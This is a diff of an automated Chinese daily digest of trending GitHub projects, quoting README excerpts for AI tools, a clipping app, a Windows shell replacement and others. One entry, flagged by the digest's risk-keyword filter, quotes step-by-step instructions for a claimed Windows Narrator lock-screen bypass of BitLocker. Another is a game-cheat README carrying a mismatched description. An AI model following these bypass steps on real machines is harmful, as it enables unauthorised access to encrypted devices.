@@ -1,534 +1,454 @@
-📊 开源日报 — 2026-11-20
-共发现 11 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-21
+共发现 10 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  toeverything/AFFiNE
-    ⭐ 75361 stars  |  🍴 5572 forks  |  💻 TypeScript  |  📅 2022-07-31
-    🔗 https://github.com/toeverything/AFFiNE
-    📡 来源: trending-daily
-    🏷️ app, crdt, editor, electron, knowledge-base, markdown, miro, notes, notion, notion-alternative
-    📝 There can be more than Notion and Miro. AFFiNE(pronounced [ə‘fain]) is a next-gen knowledge base that brings planning, sorting and creating all together. Privacy first, open-source, customizable and ready to use. 
-
-    README 摘要:
-    AFFiNE.Pro
-        Write, Draw and Plan All at Once
-        
-    
-        
-    
-      A privacy-focused, local-first, open-source, and ready-to-use alternative for Notion & Miro. 
-      One hyper-fused platform for wildly creative minds.
-    
-        Home Page |
-        Discord |
-        Live Demo |
-        Blog |
-        Documentation
-    
-    [
-    
-    Docs, canvas and tables are hyper-merged with AFFiNE - just like the word affine (əˈfʌɪn | a-fine).
-    
-    ## Getting started & staying tuned with us.
-    
-    Star us, and you will receive all release notifications from GitHub without any delay!
-    
-    ## What is AFFiNE
-    
-    [AFFiNE is an open-source, all-in-one workspace and an operating system for all the building blocks that assemble your knowledge base and much more -- wiki, knowledge management, presentation and digital assets. It's a better alternative to Notion and Miro.
-    
-    ## Features
-    
-    **A true canvas for blocks in any form. Docs and whiteboard are now fully merged.**
-    
-    - Many editor apps claim to be a canvas for productivity, but AFFiNE is one of the very few which allows you to put any building block on an edgeless canvas -- rich text, sticky notes, any embedded web pages, multi-view databases, linked pages, shapes and even slides. We have it all.
-    
-    **Multimodal AI partner ready to kick in any work**
-    
-    - Write up professional work report? Turn an outline into expressive and presentable slides? Summary an article into a well-structured mindmap? Sorting your job plan and backlog for tasks? Or... draw and code prototype apps and web pages directly all with one prompt? With you, AFFiNE AI pushes your creativity to the edge of your imagination, just like Canvas AI to generate mind map for brainstorming.
-    
-    **Local-first & Real-time collaborative**
-    
-    - We love the idea of local-first that you always own your data on your disk, in spite of the cloud. Furthermore, AFFiNE supports real-time sync and collaborations on web and cross-platform clients.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  nginx/nginx
-    ⭐ 32425 stars  |  🍴 8422 forks  |  💻 C  |  📅 2015-06-23
-    🔗 https://github.com/nginx/nginx
-    📡 来源: trending-daily
-    🏷️ content-cache, http, http2, http3, https, load-balancer, mail-proxy-server, nginx, quic, reverse-proxy
-    📝 The official NGINX Open Source repository.
-
-    README 摘要:
-    NGINX (pronounced "engine x" or "en-jin-eks") is the world's most popular Web Server, high performance Load Balancer, Reverse Proxy, API Gateway and Content Cache.
-    
-    NGINX is free and open source software, distributed under the terms of a simplified 2-clause BSD-like license.
-    
-    Enterprise distributions, commercial support and training are available from F5, Inc.
-    
-    > [!IMPORTANT]
-    > The goal of this README is to provide a basic, structured introduction to NGINX for novice users. Please refer to the full NGINX documentation for detailed information on installing, building, configuring, debugging, and more. These documentation pages also contain a more detailed Beginners Guide, How-Tos, Development guide, and a complete module and directive reference.
-    
-    # Table of contents
-    - How it works
-      - Modules
-      - Configurations
-      - Runtime
-    - Downloading and installing
-      - Stable and Mainline binaries
-      - Linux binary installation process
-      - FreeBSD installation process
-      - Windows executables
-      - Dynamic modules
-    - Getting started with NGINX
-      - Installing SSL certificates and enabling TLS encryption
-      - Load Balancing
-      - Rate limiting
-      - Content caching
-    - Building from source
-      - Installing dependencies
-      - Cloning the NGINX GitHub repository
-      - Configuring the build
-      - Compiling
-      - Location of binary and installation
-      - Running and testing the installed binary
-    - Asking questions and reporting issues
-    - Contributing code
-    - Additional help and resources
-    - Changelog
-    - License
-    
-    # How it works
-    NGINX is installed software with binary packages available for all major operating systems and Linux distributions. See Tested OS and Platforms for a full list of compatible systems.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  Tracer-Cloud/opensre
-    ⭐ 13275 stars  |  🍴 1910 forks  |  💻 Python  |  📅 2026-01-13
-    🔗 https://github.com/Tracer-Cloud/opensre
-    📡 来源: trending-daily
-    🏷️ alerting, ci-cd, cli, datadog, devops, gitlab-ci, grafana, incident-management, llm, observability
-    📝 The open-source agent for CI/CD reliability.
-
-    README 摘要:
-    OpenSRE: The open-source agent for CI/CD reliability
-    
-    Your CI tells you it broke, but not why or how to fix it. OpenSRE is a CLI agent that reads the failed run, traces the cause and pushes a fix for you to review. Self-hosted, with your own models.
-    
-      
-    
-      
-      
-        
-    
-      
-        
-      
-    
-      
-        Quickstart ·
-        Docs ·
-        FAQ ·
-        Security
-      
-    
-    ---
-    
-    > 🚧 Public Alpha: Core workflows are usable for early exploration, though not yet fully stable. The project is in active development, and APIs and integrations may evolve.
-    
-    ---
-    
-    ## Before you begin
-    
-    Make sure you have:
-    
-    - A terminal open in a code project
-    - A Git repository (recommended for the full workflow demonstration)
-    
-    ## Step 1: Install and start opensre
-    
-    macOS or Linux:
-    
-    ```bash
-    curl -fsSL https://install.opensre.com | bash -s -- -gh
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  XiaoYouChR/Ghost-Downloader-3
-    ⭐ 13140 stars  |  🍴 816 forks  |  💻 Python  |  📅 2023-08-16
-    🔗 https://github.com/XiaoYouChR/Ghost-Downloader-3
-    📡 来源: trending-daily
-    🏷️ async, asyncio, bittorent, bt, cross-platform, download-manager, downloader, fluent-design, ftp, http3
-    📝 The only downloader you need. 下载器的集大成者。
-
-    README 摘要:
-    简体中文 | English
-    
-    > [!NOTE]
-    > 
-    >
-    > Swiftproxy – Premium Global Residential Proxy Network
-    Swiftproxy provides 90M+ real residential IPs across 220+ locations worldwide, helping users access global content and manage location-specific network connections. With rotating and static residential proxies, flexible geo-targeting, and HTTP(S)/SOCKS5 support, Swiftproxy is ideal for cross-region downloads, network testing, and browser automation. Free testing available, with 10% off using code `PROXY90`.
-    
-    ## The only downloader you need
-    
-    [![Forks][forks-shield]][forks-url]
-    [![Stargazers][stars-shield]][stars-url]
-    [![Issues][issues-shield]][issues-url]
-    [![Release][release-shield]][release-url]
-    [![Downloads][downloads-shield]][release-url]
-    [![AtomGit Downloads][atomgit-downloads-shield]][atomgit-downloads-url]
-    
-    ##### Documentation · Watch Video · Report Bug · Request Feature
-    
-    ## Features
-    
-    * **Fast where it matters.** Every downloader is fast on a good connection. The real test is a bad one. Smart chunking without file merging. Auto-detects bandwidth. Real-browser TLS fingerprints, invisible to anti-bot checks.
-    * **One app instead of five.** Everything in one place, nothing watered down. `HTTP`, `Magnet/BT`, `FTP`, `M3U8`, `MPEG-DASH`, `eD2k`. `YouTube` and `Bilibili` with clip selection, any quality and subtitles, playlists and multi-part episodes. `GitHub` and `HuggingFace` with mirror acceleration.
-    * **See it. Sniff it. Download it.** A download button follows the video, any quality you want. The extension popup lists every medium on the page. Click it there, or just download as you normally would, the desktop app takes over seamlessly. No copying links, and authentication state carries over.
-    * **Native on every platform.** It shows in the details. One app, four systems, native experience everywhere. On Android, it records live M3U8 streams and keeps downloading in the background.
-    * **Always in control** Effortlessly. `aria2`-compatible RPC API for third-party tools. Change the URL, headers, or proxy mid-download. Progress is never lost.
-    
-    ## About The Project
-    
-    Started as a passion project to help a Bilibili creator manage resources. Now it ships on four platforms, handles virtually every download protocol, and has a growing Feature Packs plugin ecosystem.
-    
-    | Platform | Required Version | Architectures |
-    |:--|:--|:--|
-    |  **Windows** | `10+` | `x86_64` / `arm64` |
-    |  **macOS** | `13.0+` | `x86_64` / `arm64` |
-    |  **Linux** | `glibc 2.35+` | `x86_64` / `arm64` |
-    |  **A
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  Immortal-Protocols/lastbook
-    ⭐ 2645 stars  |  🍴 321 forks  |  💻 Python  |  📅 2026-11-12
-    🔗 https://github.com/Immortal-Protocols/lastbook
+#1  simplexai-labs/linger
+    ⭐ 3057 stars  |  🍴 281 forks  |  💻 TypeScript  |  📅 2026-11-10
+    🔗 https://github.com/simplexai-labs/linger
     📡 来源: 🚀 两周800+星
-    📝 Offline knowledge AI, maps and videos for survival and rebuilding
+    🏷️ agent-teams, local-llm, memory, personal-agent, proactive-agent, proactive-ai
+    📝 Linger is An Open-Source Personal Agent That Runs Fully on Your PC.  We aim to break Big Tech’s grip on AI by bringing powerful local AI to everyday computers through efficient model–harness co-design, so everyone can run their own.
 
     README 摘要:
-    # Lastbook
+    Linger is an open-source personal agent with a Claude-class brain running locally on your PC.
     
-    Lastbook is an offline survival library for Mac, Windows and Linux. It puts manuals, videos, encyclopedias, an offline map and
-    short practical guides on one computer. After setup, it works offline. The desktop sidebar opens Videos, Map and Chat.
-    Chat answers questions using the library, including the offline encyclopedias when they are present, and links to its sources.
+      Open-Source&nbsp;&nbsp;·&nbsp;&nbsp;Local AI&nbsp;&nbsp;·&nbsp;&nbsp;Consumer Macs &amp; PCs
     
-    Website: . Contact: hello@lastbook.org.
+      
+      
+      
     
-    > Lastbook’s original code and documentation are licensed under the MIT License.
-    > Contributions are welcome. See CONTRIBUTING.md to get started.
+      
+      
+      
+      
     
-    ## Release status
+    - **A Claude-class brain, running locally.** A 125B model on a 12 GB GPU, on everyday Macs and PCs.
+    - **The Grok Bot experience on your PC.** Zero token fees for local inference.
+    - **A loyal AI sidekick.** It remembers what matters, proactively gets things done, and keeps your data on your device.
     
-    | Platform | Version | Status |
-    |---|---|---|
-    | macOS (Apple Silicon, macOS 14 or later) | 1.1.13 | Live on lastbook.org, signed and notarized |
-    | Windows (64-bit, Windows 10 or later) | 1.1.13 | Live on lastbook.org, Authenticode signed |
-    | Linux (Ubuntu 24.04 or 26.04 LTS, x86_64) | 1.1.13 | Ubuntu packages; installation instructions below |
+    ## Cool features
     
-    ## iPad (development preview, source only)
+    ### Local models: A Claude-class brain on a 12 GB GPU
     
-    A native iPad app (Videos, Map and Chat, offline, with optional on-device AI) is in `mobile/ipad/`.
-    - It is source for contributors to build and sign themselves.
-    - There is no App Store, TestFlight or downloadable iPad build.
-    - See mobile/ipad/README.md for what works, the current limitations and how to build it.
+    Efficient AI model–harness co-design brings a full local agent to consumer Macs and PCs. Our MoE inference engine, PolyStrata, keeps a model's busiest experts on your GPU and the rest in RAM or on SSD, so larger models run with less GPU memory: the **125B** Qwen3.8-Flash-Next runs on a **12 GB card** with 64 GB of RAM. The model runs on your own machine instead of a remote server, so there is no cloud bill and no token fee.
     
-    ## Install on Linux
+    Speed: how fast seven MoE models write on 8, 12 and 32 GB GPUs
     
-    The Linux packages target **Ubuntu 24.04 LTS and Ubuntu 26.04 LTS on Intel/AMD x86_64 computers**, one package for each. Download
-    Lastbook for Ubuntu 24.04 (or for Ubuntu 26.04), then install it with apt so Ubuntu resolves its dependencies.
+      
+        Writing, tokens per second
+        Laptop RTX 40708 GB
+        RTX 306012 GB
+        RTX 509032 GB
+      
+      Qwen3.8-Flash-Next38.1 (Q2_0)¹45.5179
+      LFM2.5-24B-A2B70–7397.8480–485
+      Flint 40B-A2.5B61–6365.5251–252
+      Qwen3.6-35B-A3B94–10091.8394–395
+      Ornith 1.576–8280–82316–319
+      Gemma 4 26B-A4B92–9378.0 (Q4 file)353–356
+      Tiel Coder 35B-A3B8378.8337–345
     
-    ```bash
-    sudo apt install ./Lastbook_1.1.13_amd64.deb                  # Ubuntu 24.04
-    sudo apt install ./Lastbook_1.1.13_ubuntu26.04_amd64.deb      # Ubuntu 26.04
-    ```
-    
-    Open Lastbook from the application menu. First-run setup downloads your chosen library, state map and optional local AI.
-    The app uses Ubuntu's GTK, WebKitGTK and media codecs. Its own files install under `/opt/lastbook`, and your library and
-    settings stay in your home folder. Removing the package leaves those downloaded files and settings in place.
-    
+    ¹ Not from PolyStrata's results: our lab measured the Q2_0 file with a short prompt on a 96 GB card held to an 8 GB budget, with 32 GB of RAM and a 64K context. It is not a real 8 GB card, and it does not settle the earlier 95 tok/s IQ1_M figure: Flash-Next Coder IQ1_M gave 32.1 under the same conditions, and the full-model UD-IQ1_M was not tested.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  Bodila51/gtavi-claudecode
-    ⭐ 1051 stars  |  🍴 236 forks  |  💻 Python  |  📅 2026-11-18
-    🔗 https://github.com/Bodila51/gtavi-claudecode
+#2  iamajmeena/neonclipping
+    ⭐ 1390 stars  |  🍴 66 forks  |  💻 Python  |  📅 2026-11-19
+    🔗 https://github.com/iamajmeena/neonclipping
     📡 来源: 🚀 5天300+星
-    🏷️ agent-skills, claude-code, clipping, gta6, tiktok, youtube-shorts
-    📝 Claude Code plugin that turns GTA 6 streams into paid vertical clips: live campaigns, trending videos, best moments, 9:16 cuts with hooks, captions and credits.
+    🏷️ clipping, ffmpeg, shorts, video, whisper, yt-dlp
+    📝 Paste a link, get captioned 9:16 clips in ~2 min. Free, local, open-source clipping engine (audio-first, YouTube captions, local LLM).
 
     README 摘要:
-    gtavi-claudecode
+    # NeonClipping
     
-    Rockstar made the game.Claude Code makes you the money.
+    **Paste a link. Get captioned 9:16 clips in about two minutes. Free, local, open-source.**
     
-    GTA 6 is about to break the internet. Claude Code watches the biggest streams, catches the second chat explodes and hands you a ready-to-post vertical clip. Campaigns pay per 1,000 views. You just hit post.
+    NeonClipping turns long YouTube / Twitch / Kick videos (or your own MP4) into vertical, captioned clips with a title and hook for each. Everything runs on your machine: no account, no subscription, no upload.
     
-       
      
-    Unofficial fan project. Not affiliated with Rockstar Games, Take-Two or Anthropic.
-    Quick start · Make money · Skills · Clip rules · Scripts
     
-    ```
-    /plugin marketplace add Bodila51/gtavi-claudecode
-    /plugin install gtavi-claudecode@gtavi-claudecode
-    ```
+    🌐 **Website with one-click Windows setup:** 
     
-    Two lines in Claude Code. In 10 minutes you have: the tools installed, your page folder, today's trending GTA 6 videos, the best moments picked and your first vertical clips ready to post.
+    **Made by Ajay K Meena** (Director, DOP, colorist, DaVinci Resolve educator, Jaipur). If NeonClipping saves you time, please ⭐ star the repo and follow @iamajmeena on Instagram.
     
-    ## First run: paste this into Claude Code
+    📘 **Guides (Hindi + English, PDF):** docs/NeonClipping-Guide-EN-HI.pdf  
+    🤖 **Let an AI agent install it for you:** copy docs/NEONCLIPPING-AGENT-SETUP-PROMPT.txt into Claude Code, Codex CLI or Cursor.
     
-    ```
-    Use gtavi-claudecode. Set up my GTA 6 clip page, ask me your 4 questions in one message,
-    then do everything after one "yes": find live clipping campaigns, show today's trending
-    GTA 6 videos and live streams, find the best moments in the top one, cut my first 3 clips
-    with hooks, check them against the campaign rules, and tell me what to post where.
-    ```
+    ## How it finds good moments
     
-    ## Two ways to make money
+    Two modes, one button.
     
-    **1. Paid clipping campaigns (fastest).** Streamers and brands pay clippers per 1,000 views on approved clips. On Whop Content Rewards around $1 per 1K views is common; every campaign shows its own rate, budget left and rules. `campaign-finder` reads them live and never guesses a number. You read the rules, clip only that creator, post, submit the link.
+    **⚡ Fast mode (default, videos over 10 min)** copies the trick that makes the fastest clippers fast: never look at the whole video.
     
-    **2. Your own faceless GTA 6 page (bigger, slower).** The built-in playbook runs it: daily content mix, credit rules, caption templates, the launch-day "be first" plan and a learning loop. Platforms don't pay for reposted clips, so the page grows on speed, useful tips and credited clips, then earns through campaigns and partnerships.
+    1. Download **audio only** (79 MB for an 85-minute video, about 10 s).
+    2. Take the transcript for free from YouTube's own captions (word-timed). No speech model needed. For other sources a local Whisper model is used as the fallback.
+    3. Score the whole audio track for *sudden loudness jumps* (vs a 2-minute local baseline), *raised voices* (2–4 kHz energy) and quiet-to-loud transitions.
+    4. Take the best moments, read each one's transcript with a local LLM (Ollama) and let it score the moment, write a title and a hook. Snap the start and end to sentence boundaries inside your Min/Max length.
+    5. Download **only the chosen sections** of the video (not the whole file), trim exactly by matching their sound to the audio track, and render 1080x1920 clips with burned-in captions.
     
-    No income is promised. Your result depends on speed, picks and hooks, and the scoreboard shows what works.
+    **🔬 Deep mode** downloads the whole video, adds optical-flow motion (OpenCV Farneback: fast objects, impacts, camera whips) and cut density to the audio signals, shortlists 4× more candidates and gives the LLM 15 seconds of context before and after each one.
     
-    ## The rules that make clips win
+    Measured on one machine (RTX 2060, 16 threads), Fast mode, 3 clips each:
     
-    - Hook in the first second. Say why to keep watching ("the hidden car nobody found").
-    - 7 to 30 seconds. Cut dead air at the start, end on the payoff.
-    - Big captions in the safe area. Most people watch muted.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  bookwjitchieni1986/blender-ai-mcp-addon
-    ⭐ 943 stars  |  🍴 1 forks  |  💻 None  |  📅 2026-11-19
-    🔗 https://github.com/bookwjitchieni1986/blender-ai-mcp-addon
-    📡 来源: 🚀 5天300+星
-    🏷️ ai-agents, ai-assistant, blender, blender-addon, blender-ai, blender-automation, blender-mcp, blender-plugin, blender-scripting, bpy
-    📝 AI assistant and MCP server for Blender: visual chat, scene tools, multi-agent workflows. Works with ChatGPT/GPT, Claude, Gemini, Ollama, OpenCode. Blender AI addon, copilot for 3D, bpy Python scripting, MCP integration.
-
-    README 摘要:
-    ﻿# mcp-for-blender-pro
-    
-    ### Your Blender scene. Your AI models. One creative workspace.
-    
-    **An AI assistant for Blender that can inspect your scene, build objects, edit materials, find assets and carry out multi-step workflows—with a visual chat workspace and a built-in Model Context Protocol (MCP) server.**
-    
-    Download · Getting started · Connections and agents
-    
-    ## Turn a creative brief into scene operations
-    
-    Start with an idea. Ask the assistant to inspect your scene, create a product-display layout, arrange objects, assign materials or prepare an export. Follow its actions in the conversation and inspect the result in the viewport preview. Keep working in Blender throughout the process.
-    
-    **mcp-for-blender-pro brings conversation, scene tools, model choice and agent workflows together.** It is designed for artists who want faster iteration, technical artists who automate repetitive work, and developers connecting AI tools to Blender.
-    
-    ## Why choose mcp-for-blender-pro?
-    
-    | Capability | What it gives you |
+    | Source | Time |
     |---|---|
-    | **Blender-aware assistance** | Scene and object inspection gives the assistant context before it acts. |
-    | **A visual Studio workspace** | Chat, scene objects, viewport snapshots, approvals and a task board in a companion window. |
-    | **Your choice of AI** | Connect supported cloud providers, local Ollama models or compatible custom endpoints. |
-    | **Saved connections** | Keep work and personal connections separate, including multiple keys for the same provider. |
-    | **One assistant or a team** | Use a single model for quick changes, or managers, workers and reviewers for structured tasks. |
-    | **Built-in MCP server** | Connect OpenCode and other clients supporting authenticated Streamable HTTP MCP. |
-    | **21 scene tools** | Create, inspect, edit, capture, search assets, consult Blender APIs and export scenes. |
-    | **Multilingual menus** | Choose English, German, French, Spanish or Chinese for the main interface. |
+    | 85-minute YouTube stream (YouTube captions) | **97 s** |
+    | 3-hour Twitch VOD (no captions, local speech model) | **136 s** |
+    | 90-second YouTube trailer | 21 s |
+    | 90-second local MP4 | 14 s |
     
-    ## From a quick edit to an agent team
+    Your numbers depend on network and CPU.
     
-    Use **Single assistant** for direct, conversational work. For larger tasks, configure a **Team chain** with individual responsibilities, instructions and models.
-    
-    - **Manager:** breaks the request into assignments and acceptance criteria.
-    - **Workers:** perform the assigned scene operations.
-    - **Reviewers:** inspect results and approve work or return specific findings.
-    
-    Tasks run sequentially so scene edits stay ordered. A blocked task gets one correction attempt; a second failed review stops the work
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  0marContreras/gta6recomp
-    ⭐ 707 stars  |  🍴 41 forks  |  💻 None  |  📅 2026-11-18
-    🔗 https://github.com/0marContreras/gta6recomp
+#3  Lemxy/WinRust
+    ⭐ 807 stars  |  🍴 40 forks  |  💻 Rust  |  📅 2026-11-17
+    🔗 https://github.com/Lemxy/WinRust
     📡 来源: 🚀 5天300+星
-    📝 A GTA VI PC Port
+    📝 Windows shell replacement in Rust: taskbar, file manager, NTFS search, task manager, disk cleaner. One installer exe.
 
     README 摘要:
-    # GTA VI PC Recomp
+    ﻿
     
-    > Runtime shader recompilation and performance optimization framework for Grand Theft Auto VI (PC)
+    # WinRust
     
-    ## Overview
+    **A Windows shell written in Rust: faster and lighter than the stock one.** Small native programs (no .NET, no Electron) that replace parts of Windows: the taskbar, File Explorer, file search, Task Manager, plus a disk cleaner, a disk map and a photo viewer. One installer puts them in, one button takes them all out.
     
-    GTA VI PC Recomp is an experimental runtime optimization framework focused on reducing shader compilation stutter, improving asset streaming responsiveness, and enhancing frame pacing consistency in Grand Theft Auto VI for PC.
+    English | Русский
     
-    The project provides dynamic shader cache generation, multi-threaded asset preparation, and render pipeline optimizations designed to improve gameplay smoothness across a wide range of hardware configurations.
-    
-    ## Features
-    
-    ### Rendering Optimizations
-    
-    - Runtime shader cache generation
-    - Dynamic PSO (Pipeline State Object) management
-    - Multi-threaded shader preloading
-    - Reduced DX12 shader compilation stutter
-    - Improved render pipeline responsiveness
-    
-    ### CPU Optimization
-    
-    - Dynamic thread management
-    - Hybrid-core scheduling support
-    - Background task balancing
-    - Reduced main-thread bottlenecks
-    
-    ### Memory & Streaming
-    
-    - Optimized texture streaming
-    - Improved asset loading prioritization
-    - Dynamic decompression scheduling
-    - Reduced world streaming hitching
-    
-    ### Upscaling & Frame Generation
-    
-    Compatible with:
-    
-    - NVIDIA DLSS
-    - AMD FSR
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#9  CricketSeparator/aion-2-trainer-tool
-    ⭐ 173 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-06-26
-    🔗 https://github.com/CricketSeparator/aion-2-trainer-tool
-    📡 来源: 🤖 AI / LLM / RAG | 活跃 | prompt engineering tool
-    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
-    📝 Aion 2, an advanced prompt engineering resource, is a pre-configured environment designed for seamless integration into your local...
-
-    README 摘要:
-    # Aion 2 Cheat - Windows 10 & 11
-    
-    ## Introduction
-    
-    Aion 2 Cheat is a specialized software tool designed for players of the Aion 2 game, aimed at enhancing gameplay through various automated features and optimizations. It addresses common challenges faced by players, such as difficulty in combat, resource management, and game progression, providing users with an edge in their gaming experience.
-    
-    With Aion 2 Cheat, users can expect practical capabilities such as automated combat scripts, resource gathering, and performance enhancements, allowing for a smoother and more efficient gaming experience. This tool is particularly beneficial for gamers looking to streamline their gameplay and reduce repetitive tasks, enabling them to focus on enjoying the game.
-    
-    By automating specific gameplay elements, Aion 2 Cheat empowers players to overcome challenges that may otherwise require intensive time investment. For example, players can automate resource collection, which is essential for crafting and upgrading equipment, thus allowing them to progress more swiftly through the game. Additionally, combat automation can free players from the repetitive nature of grinding mobs, enabling them to engage more with the story and exploration aspects of Aion 2.
-    
-    ---
-    
-    ## System Requirements
-    
-    | Requirement              | Details                                           |
-    |-------------------------|---------------------------------------------------|
-    | **Supported OS**        | Windows 10 and Windows 11                        |
-    | **Architecture**        | x64 (64-bit)                                     |
-    | **Processor**           | Not specified                                     |
-    | **RAM**                 | Not specified                                     |
-    | **Storage**             | Not specified                                     |
-    | **Permissions**         | Administrator privileges may be required          |
-    | **Internet Connection** | Not specified                                     |
-    | **Dependencies**        | Not specified                                     |
-    
-    ### Recommended Specifications
-    
-    While specific hardware requirements are not detailed, it is generally recommended that users have:
-    
-    - **Processor**: A modern multi-core processor (e.g., Intel i5 or AMD Ryzen 5) to manage the demands of gaming and the cheat software simultaneously.
-    - **RAM**: At least 8 GB of RAM to ensure smooth operation, especially if running other applicatio
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#10  YanNyeinHtet/EggLab
-    ⭐ 58 stars  |  🍴 5 forks  |  💻 JavaScript  |  📅 2026-11-15
-    🔗 https://github.com/YanNyeinHtet/EggLab
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
-    🏷️ agent, ai, electron, image-generation, local-first, mit, photocraft, qwen, stable-diffusion, windows
-    📝 Local AI image generation and editing for Windows - a design agent for PhotoCraft powered by Qwen-Image-2.1 (no ComfyUI, no Python, no cloud).
-
-    README 摘要:
-    # EggLab
-    
-    **Local AI image generation and editing for Windows.** A floating egg opens a design agent
-    for **PhotoCraft** — chat, generate, edit layers, and place results straight onto the canvas.
-    
-    Everything runs on your own GPU: Qwen-Image-2.1 on
-    stable-diffusion.cpp. No ComfyUI, no
-    Python, no cloud rendering.
-    
-    ## What it can do
-    
-    - **Chat with a design agent** that knows PhotoCraft: layers, masks, text, exports.
-    - **Generate images** (quality 40-step or turbo 8-step LoRA) at up to 2048 px.
-    - **Edit images** — reference photos, multi-reference compositions, transparent cut-outs.
-    - **Place results** on the PhotoCraft canvas as layers, or export flat/layered files.
-    - **Local-first** — models and renders stay on your disk; only chat text goes to the model
-      provider you pick.
-    
-    ## Requirements
-    
-    - Windows 10 or 11 (x64)
-    - **PhotoCraft** installed (download free) — the canvas app EggLab drives; not bundled
-    - ~25 GB free disk: engine (17 MB–1.5 GB depending on GPU) + models (~20 GB, your choice)
-    - A GPU is strongly recommended:
-      - NVIDIA → CUDA engine (fastest, ~1.4 GB download)
-      - Any DX12 GPU → Vulkan engine (~29 MB)
-      - CPU works but is slow
-    - Internet for the engine download and the model downloads
+    > **Read this first.** WinRust turns off Windows Search, hides the taskbar and can turn off Explorer as the shell. The exe is not code-signed, so SmartScreen will warn you. A restore point is created before install, but try it on a spare machine or a VM first.
     
     ## Install
     
-    1. Download **`EggLab-Setup-.exe`** from Releases.
-    2. Windows SmartScreen will warn because the installer is not code-signed yet:
-       **More info → Run anyway**. This is an unsigned-publisher warning, not a
-       virus detection; verify `SHA256SUMS.txt` if you want to check the download.
-       The fix and the signing options are in docs/SIGNING.md.
-    3. The installer copies the app (~77 MB) and downloads the engine that matches your GPU
-       (SHA-256 verified, resumable; CUDA → Vulkan → CPU fallback if a download fails).
-    4. Launch EggLab and finish the setup wizard (below).
+    1. Download `WinRust.exe` from the latest release (Windows 10/11, x64).
+    2. Run it as administrator.
+    3. Tick the components you want and press the install button. On a fresh install, `rust-explorer` is unchecked. Tick it to replace the Windows Explorer shell (or use the gear on the topbar row: the **Shell: rust-explorer** switch). They are installed in the right order; one that fails or is skipped does not stop the others, the window lists what went wrong.
+    
+    Windows Search is optional: on a stripped Windows (for example a debloated LTSC image without the Windows Search service) that step is skipped with a warning instead of failing the install.
+    
+    If UAC asks for **another administrator's** password, the per-user settings (startup entries, scheduled tasks, PowerShell profile, search permissions) still go to the user who is signed in, not to the administrator you typed. If the installer cannot tell who that is, it stops before changing anything.
+    
+    **Update:** download the new `WinRust.exe` from the releases page, run it as administrator and select the components you want to update or install. An existing `rust-explorer` stays selected by default for updates. Your settings and the saved original Windows values stay.
+    
+    The installer is in English. The **Русский** button in its corner (or "WinRust apps in Русский" in the bar's right-click menu) switches every WinRust program to Russian.
+    
+    ## Remove
+    
+    - **Remove all** in the installer window undoes everything: Windows Search, the taskbar, Explorer and the services come back.
+    - One plugin at a time: `plugin-launcher uninstall ` (see Command line).
+    - **If the screen is left without a taskbar or desktop:** press Ctrl+Alt+Del → Task Manager → Run new task → `explorer.exe`, then run the installer and press Remove all.
+    
+    On uninstall, `rust-explorer` restores the service startup values and the svchost grouping t
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#4  ⚠️风险  MSNightmare/FastUnlock
+    ⚠️ 命中风险词: exploit, 0day, bypass —— 默认归排除区，需人工确认
+    ⭐ 609 stars  |  🍴 100 forks  |  💻 None  |  📅 2026-11-19
+    🔗 https://github.com/MSNightmare/FastUnlock
+    📡 来源: 🚀 5天300+星
+    📝 FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
+
+    README 摘要:
+    # FastUnlock
+    FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
+    
+    The vulnerability exist in the way how narrator handles UI in a locked account context, succesful exploitation results in bypassing bitlocker and executing code in the context of the lockscreen account "WsiAccount"
+    
+    It took a total of 5 minutes from finding this to breaching a fully encrypted bitlocker machine with Windows 11 26H2 November Patch installed, an issue caused by total negligence from Microsoft's side... The vulnerability seems to be extremely consistent in every machine I tested it in, in other words, if you know how to control narrator in the background properly or just press the correct combination of buttons, you will get code execution in the target machine as well.
+    
+    Obviously this needs physical access and at least one account in the machine to be linked to an online account, this breaks the guarantee that a properly secured bitlocker machine cannot be accessed even if the attacker has physical access so hold tight any windows machines until Microsoft patches this.
+    
+    In the process of giving narrator a new look, Microsoft forgot to make sure that the new UI does not run in the case it was running in the context of a lockscreen user (interestingly it still has the old code that prevents it from spawning the window if it's running as SYSTEM)
+    Unlike the previous lockscreen bypass bugs I found in the past (by example ZDI-21-1053), this one is extremely convenient to use, when you click "I forgot my PIN" (or password or whatever), 
+    
+    As soon as you the Microsoft account window prompts you for an action to reset the account, press Win+U and click on narrator,
+    
+    The second you enable narrator it will immediately focus on a background window owned by narrator, this exact window will be in the background but you would not be able to see it
+    
+    As you can see narrator is focused on the "Next" button, to navigate hold the caps key (Do not release) and use arrow keys to navigate, your next objective is obvious, click on the "Math reading settings", in order to click the actual link, you can press CAPS + Enter, this will take you to the next step, the settings window
+    
